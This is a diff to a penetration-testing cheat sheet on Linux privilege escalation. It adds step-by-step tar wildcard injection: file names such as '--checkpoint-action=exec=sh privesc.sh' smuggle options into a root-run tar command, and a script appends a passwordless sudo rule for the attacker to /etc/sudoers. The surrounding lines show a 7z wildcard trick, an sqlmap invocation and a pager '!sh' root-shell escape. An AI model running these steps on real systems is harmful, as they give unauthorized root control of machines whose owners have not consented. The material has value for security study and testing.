@@ -261,7 +261,7 @@ sqlmap -r request.txt -p <target_param> -D <DB_name> -T <TABLE_name> -C <column_
 
 ### Wildcards Injection
 ```bash
-# This works a privileged user (e.g., root) executes a 7z command with wildcards like:
+# This works a privileged user executes a 7z command with wildcards like:
 7za a /backup/$filename.zip -t7z -snl -p$pass -- *
 
 # 1. Navigate to the directory where the 7z command is executed
@@ -369,6 +369,33 @@ sudo systemctl status example.service
 # 2. In the pager (like less) that opens, try the following commands to spawn a root shell
 !sh
 ```
+
+## Tar
+
+### Wildcards Injection
+```bash
+# This works when a privileged user executes a tar command with wildcards like:
+tar -zcf /path/to/backup.tgz *
+
+# 1. Navigate to the directory where the tar command is executed
+cd /path/to/target/directory
+
+# 2. Create checkpoint files
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh privesc.sh'
+
+# 3. Create a bash script for privilege escalation
+cat << EOF > privesc.sh
+#!/bin/bash
+echo 'currentuser ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
+EOF
+chmod +x privesc.sh
+
+# 4. Wait for the tar command to be executed by the privileged user
+# The checkpoint files will be interpreted as tar options, executing the script
+```
+> - https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
+
 
 # Windows Privilege Escalation
 
